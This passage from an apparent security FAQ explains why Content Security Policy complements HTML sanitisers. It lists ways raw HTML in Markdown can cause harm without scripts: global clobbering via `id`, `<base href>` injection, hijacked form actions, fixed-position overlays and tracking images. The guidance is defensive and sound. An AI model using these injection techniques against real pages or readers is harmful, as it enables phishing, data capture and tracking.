The bug in your sanitiser. A sanitiser removes markup it recognises as dangerous; a CSP tells the browser not to execute scripts at all, which holds even when something slipped through. It also closes vectors an allow-list cannot express, such as an injected `<base href>` — that one needs `base-uri 'none'`.

### Can raw HTML in Markdown do damage without any JavaScript?

Yes, and this is the part people miss. An `id` attribute clobbers a global, a `<base href>` repoints every relative link on the page, a `<form action>` sends the reader's input elsewhere, `position: fixed` in a `style` attribute covers your interface with somebody else's, and a remote `<img src>` reports when your document was read. None of those needs a script tag.

### A `.md` file arrived from someone I do not know — is the converted HTML safe to open?

Only with a converter that sanitises, and it is worth knowing which. Several widely used converters pass raw HTML through by design and say so in their documentation, so the `<script>` in the file becomes a `<script>` in the HTML you open. Check the tool's behaviour before you double-click the output, and remember that if you forward that HTML on, it now arrives from you.
